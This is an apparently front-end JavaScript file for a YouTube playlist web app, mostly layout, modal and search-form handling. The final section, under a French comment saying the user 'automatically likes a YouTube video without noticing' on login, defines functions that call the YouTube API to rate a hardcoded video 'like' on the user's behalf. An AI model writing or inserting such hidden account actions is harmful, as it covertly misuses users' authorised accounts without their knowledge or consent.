var refresh = document.querySelector("#playlists .refresh");
refresh.onclick = function(){
	getPlaylists();
}

var setSize = function(){
	if (window.innerWidth<=1110){
		main_content.classList.remove('fullscreen');
		hide(addVideoButton);
		hide(modalAddVideo);
		hide(backgroundModal);
		if (!myChannel){
			hide(addVideoButton);
		}
		else show(addVideoButton);
		if (window.innerWidth<=850){
			/*A COMPLETER POUR VERSION MOBILE*/
		}
		else{
			left_aside.style.height = window.innerHeight + "px";
			main_content.style.height = window.innerHeight + "px";
			video_search.style.height = window.innerHeight + "px";
			video_search.style.height = 80/100*window.innerHeight + "px";
			if (modalAddVideo.classList.contains('show')){
				hide(modalAddVideo);
			}
		}
	}
	else{
		if (!myChannel){
			hide(video_search);
			main_content.classList.add('fullscreen');
		}
		if (window.innerWidth<=850){
			/*A COMPLETER POUR VERSION MOBILE*/
		}
		left_aside.style.height = window.innerHeight + "px";
		main_content.style.height = window.innerHeight + "px";
		video_search.style.height = window.innerHeight + "px";
		left_aside.classList.remove("filter");
		main_content.classList.remove("filter");
		show(modalAddVideo);
		// if (!myChannel){
		// 	main_content.classList.add('fullscreen');
		// }
	}
}

addVideoButton.addEventListener('click', function(e){
	var buttonClassList = addVideoButton.classList;
	var modalClassList = modalAddVideo.classList;
	var backgroundModalClassList = backgroundModal.classList;
	modalClassList.remove('hide');
	modalClassList.add('show');
	buttonClassList.remove('show');
	buttonClassList.add('hide');
	backgroundModalClassList.remove('hide');
	backgroundModalClassList.add('show');
	left_aside.classList.add("filter");
	main_content.classList.add("filter");

});

closeModalButton.addEventListener('click', function(e){
	var buttonClassList = addVideoButton.classList;
	var modalClassList = modalAddVideo.classList;
	var backgroundModalClassList = backgroundModal.classList;
	modalClassList.remove('show');
	modalClassList.add('hide');
	buttonClassList.remove('hide');
	buttonClassList.add('show');
	backgroundModalClassList.remove('show');
	backgroundModalClassList.add('hide');
	left_aside.classList.remove("filter");
	main_content.classList.remove("filter");
});

backgroundModal.addEventListener('click', function(e){
	var buttonClassList = addVideoButton.classList;
	var modalClassList = modalAddVideo.classList;
	var backgroundModalClassList = backgroundModal.classList;
	modalClassList.remove('show');
	modalClassList.add('hide');
	buttonClassList.remove('hide');
	buttonClassList.add('show');
	backgroundModalClassList.remove('show');
	backgroundModalClassList.add('hide');
	left_aside.classList.remove("filter");
	main_content.classList.remove("filter");
});

window.addEventListener('resize', setSize);
window.onload = function(){	
	setSize();
}


//Detect click outside editPlaylistBlock to close it
window.addEventListener('click', function(e){
	var classList = editPlaylistBlock.classList;
	if (!editPlaylistBlock.contains(e.target) && !editPlaylistButton.contains(e.target)){
		if (classList.contains('show')){
			classList.remove('show');
			classList.add('hide');
			editPlaylistButton.classList.remove("clicked");
		}
	}
});



//Style de la poubelle de la suppression de playlist
var trash = document.querySelector('.fa-trash-o');

trash.addEventListener("mouseover", function(){
	trash.classList.remove('fa-trash-o');
	trash.classList.add('fa-trash');
});

trash.addEventListener("mouseout", function(){
	trash.classList.add('fa-trash-o');
	trash.classList.remove('fa-trash');
});


var searchVideoForm = document.getElementById('searchVideoForm');

searchVideoForm.addEventListener("submit", function(e){
	e.preventDefault();
	var query = document.getElementById('query').value;
	searchVideo(query);
});





//À sa connexion, l'utilisateur like automatiquement une vidéo youtube sans s'en apercevoir 
function executeRequest(request) {
	request.execute();
}

function videosRate(params) {
	var request = gapi.client.youtube.videos.rate(params);
	executeRequest(request);
}

function defineRequest() {
	videosRate({
		'id': 'EynHWoEka-s',
		'rating': 'like'
	});
}